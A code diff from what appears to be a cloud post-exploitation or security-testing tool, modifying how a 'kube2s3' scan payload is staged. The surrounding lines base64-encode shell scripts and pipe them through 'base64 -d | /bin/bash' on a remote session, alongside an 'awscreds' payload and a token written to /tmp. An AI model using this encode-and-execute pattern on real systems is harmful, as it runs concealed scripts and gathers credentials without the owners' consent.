@@ -448,13 +448,23 @@ echo $ACCESS_TOKEN > /tmp/instance_access_token.json
                     f"/bin/bash -c 'echo {payload.decode()} | tee /tmp/payload_awscreds | base64 -d | /bin/bash'",
                     cwd="/tmp", timeout=900)
             elif task_name == "kube2s3":
-                with open(f"{task_name}.sh", 'rb') as f:
+                # create work directory
+                task_path = Path(f"/{task_name}")
+                if task_path.exists() and task_path.is_dir():
+                    shutil.rmtree(task_path)
+                task_path.mkdir(parents=True)
+
+                # copy our payload to the local working directory
+                task_script = Path(f"{script_dir}/../resources/{task_name}.sh")
+                shutil.copy2(task_script, task_path)
+
+                with open(Path.joinpath(task_path, Path(f"{task_name}.sh")), 'rb') as f:
                     payload = base64.b64encode(f.read())
 
                 session.log("running scan payload...")
                 result = session.platform.run(
                     f"/bin/bash -c 'echo {payload.decode()} | tee /tmp/payload_kube2s3 | base64 -d | /bin/bash'",
-                    cwd="/tmp", timeout=900)
+                    cwd=task_path, timeout=900)
                 session.log(result)
 
                 files = ["/tmp/kube_bucket.tgz"]
